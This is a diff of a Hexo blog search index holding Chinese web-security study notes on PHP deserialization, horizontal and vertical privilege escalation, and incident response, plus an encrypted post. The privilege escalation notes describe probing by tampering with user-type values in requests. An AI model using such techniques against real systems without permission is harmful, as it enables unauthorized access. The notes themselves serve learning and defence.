-    <url>/2023/02/04/%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="322460698ad58fcf9afc64f2286fa3d231c7116747e5eb0ed969ca8fa9f1c1f8">846ad8ec6e6943494449754732cecabb0692a1304be39474ee8329e6d325badb03731f5c49b8db331f3a7bedf6a74845</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">弱口令</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>实验</category>
-      </categories>
-      <tags>
-        <tag>测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反序列化</title>
-    <url>/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>序列化：</strong>序列化是将变量或对象转换成字符串的过程，用于存储或传递的值的过程中，同时不丢失其类型和结构。</p>
-<p><strong>反序列化：</strong>反序列化是将字符串转换成变量或对象的过程</p>
-<p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210150104844.png" alt="image-20230210150104844"></p>
-<span id="more"></span>
-
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码 执行，SQL 注入，目录遍历等不可控后果。</p>
-<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>() <span class="comment">//将一个对象转换成一个字符串` </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>() <span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure>
-
-<p>触发原因：<code>unserialize()</code> 函数的变量可控，文件中存在可利用的类与类中的魔术方法。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//创建对象时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性`</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用 isset()或 empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用 unset()时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发`</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="无类序列化"><a href="#无类序列化" class="headerlink" title="无类序列化"></a>无类序列化</h3><p>运行代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;yuanjiu&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:7:&quot;yuanjiu&quot;;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>有类与无类的区别主要在于有无魔术方法，而魔术方法在特定情况下会被触发</strong></p>
-<h3 id="有类序列化"><a href="#有类序列化" class="headerlink" title="有类序列化"></a>有类序列化</h3><p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210154025361.png" alt="image-20230210154025361"></p>
-<p>代码审计&#x3D;》魔术方法</p>
-<p>参考文章：</p>
-<p><a href="https://www.freebuf.com/articles/network/355848.html">https://www.freebuf.com/articles/network/355848.html</a></p>
-<p><a href="https://www.freebuf.com/articles/web/341654.html">https://www.freebuf.com/articles/web/341654.html</a></p>
-<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见中间件的总结</title>
     <url>/2023/02/06/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h3 id="1-Apache"><a href="#1-Apache" class="headerlink" title="1.Apache"></a>1.Apache</h3><p>​		Apache HTTP服务器是一个模块化的服务器，可以运行在几乎所有广泛使用的计算机平台上。其属于应用服务器。Apache 支持支持模块多，性能稳定，Apache本身是静态解析，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等。</p>
@@ -960,80 +1099,25 @@
       </tags>
   </entry>
   <entry>
-    <title>水平垂直越权</title>
-    <url>/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
-    <content><![CDATA[<p><img src="/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20230207151741353.png" alt="image-20230207151741353"></p>
-<span id="more"></span>
-
-<p><strong>水平越权</strong>：获取同级用户账户信息</p>
-<p><strong>垂直越权</strong>：添加高权限用户</p>
-<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>获取添加用户的数据包</p>
-<h5 id="如何获取数据包"><a href="#如何获取数据包" class="headerlink" title="如何获取数据包"></a>如何获取数据包</h5><ol>
-<li>普通用户前端有操作页面可以抓取数据包</li>
-<li>通过网站源码本地搭建去模拟抓取</li>
-<li>盲猜</li>
-</ol>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h5 id="前端漏洞造成：界面"><a href="#前端漏洞造成：界面" class="headerlink" title="前端漏洞造成：界面"></a>前端漏洞造成：界面</h5><p>判断用户等级后，代码界面部分进行可选显示 </p>
-<h5 id="后端漏洞造成：数据库"><a href="#后端漏洞造成：数据库" class="headerlink" title="后端漏洞造成：数据库"></a>后端漏洞造成：数据库</h5><p>user 表(管理员和普通用户同表）如：</p>
-<table>
-<thead>
-<tr>
-<th>id</th>
-<th>username</th>
-<th>password</th>
-<th>usertype</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>admin</td>
-<td>123456</td>
-<td>1</td>
-</tr>
-<tr>
-<td>2</td>
-<td>xiaodi</td>
-<td>11111</td>
-<td>2</td>
-</tr>
-</tbody></table>
-<p><strong>代码的级别判断</strong>：usertype值</p>
-<p>若访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，可尝试对此值进行修改，这就是测试越权漏洞基本方法。</p>
-]]></content>
+    <title>加密实验</title>
+    <url>/2023/02/04/%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="322460698ad58fcf9afc64f2286fa3d231c7116747e5eb0ed969ca8fa9f1c1f8">846ad8ec6e6943494449754732cecabb0692a1304be39474ee8329e6d325badb03731f5c49b8db331f3a7bedf6a74845</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">弱口令</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
-        <category>学习</category>
+        <category>实验</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>逻辑越权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>应急响应总结</title>
-    <url>/2023/02/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="PDCERF-国际权威应急响应流程"><a href="#PDCERF-国际权威应急响应流程" class="headerlink" title="PDCERF(国际权威应急响应流程)"></a>PDCERF(国际权威应急响应流程)</h2><p>PDCERF 方法论是一种防范使用的方法，其将应急响应分成六个阶段，分别是准备阶段、检测阶段、抑制阶段、根除阶段、恢复阶段、总结阶段。</p>
-<p><img src="https://pic1.zhimg.com/v2-0be516bc34e75f8b7f249b989820e340_r.jpg" alt="preview"></p>
-<span id="more"></span>
-
-<p>入侵情景：</p>
-<ol>
-<li>网站页面遭到篡改、被挂暗链、黑链；</li>
-<li>对外提供服务的服务器存在木马、挖矿软件、VPN等异常程序；</li>
-<li>发现异常链接、cpu占用率飙升、服务器卡死；</li>
-<li>安全软件检测到网内存在大量异常链接、占用带宽资源。导致单位无法正常上网；</li>
-<li>dos大规模流量攻击；</li>
-<li>安全监管部门检测发现该单位存在异常而被通告</li>
-</ol>
-<p>参考文章：</p>
-<p><a href="https://www.cnblogs.com/simon7s/p/12484155.html">https://www.cnblogs.com/simon7s/p/12484155.html</a></p>
-<p><a href="https://www.freebuf.com/articles/web/198443.html">https://www.freebuf.com/articles/web/198443.html</a></p>
-<p><a href="https://www.wangan.com/wenda/2829">https://www.wangan.com/wenda/2829</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>应急响应</tag>
+        <tag>测试</tag>
       </tags>
   </entry>
   <entry>
